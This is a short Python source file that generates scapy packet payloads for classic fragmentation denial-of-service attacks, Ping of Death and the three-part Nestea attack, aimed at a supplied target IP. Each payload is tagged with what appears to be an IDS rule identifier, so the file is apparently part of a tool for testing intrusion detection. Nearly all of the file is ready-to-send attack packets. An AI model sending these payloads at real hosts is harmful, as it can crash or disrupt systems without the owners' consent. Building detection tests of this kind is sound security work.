#!/usr/bin/env python
###
# @author $Author$
# @version $Revision$
# @lastmodified $Date$
#

import ConfigParser

class FragmentedPackets():
    def __init__(self, target):
        # Read configuration
        self.config = ConfigParser.RawConfigParser()
        self.config.read('config.cfg')

        self._target = target
        self.payloads = []

    def getPayloads(self):

        ### Ping of death
        self.payloads.append([
            "Ping of death",
            "scapy",
            """send(fragment(IP(dst="%s")/ICMP()/("X"*60000)), verbose=0)""" % self._target,
            "123:"
            ])

        ### Nestea attack 1/3
        self.payloads.append([
            "Nestea Attack 1/3",
            "scapy",
            """send(IP(dst="%s", id=42, flags="MF")/UDP()/("X"*10), verbose=0)""" % self._target,
            "123:"
            ])
        ### Nestea attack 2/3
        self.payloads.append([
            "Nestea Attack 2/3",
            "scapy",
            """send(IP(dst="%s", id=42, frag=48)/("X"*116), verbose=0)""" % self._target,
            "123:"
            ])
        ### Nestea attack 3/3
        self.payloads.append([
            "Nestea Attack 3/3",
            "scapy",
            """send(IP(dst="%s", id=42, flags="MF")/UDP()/("X"*224), verbose=0)""" % self._target,
            "123:"
            ])

        return self.payloads

if __name__ == "__main__":
    print FragmentedPackets("192.168.100.48").getPayloads()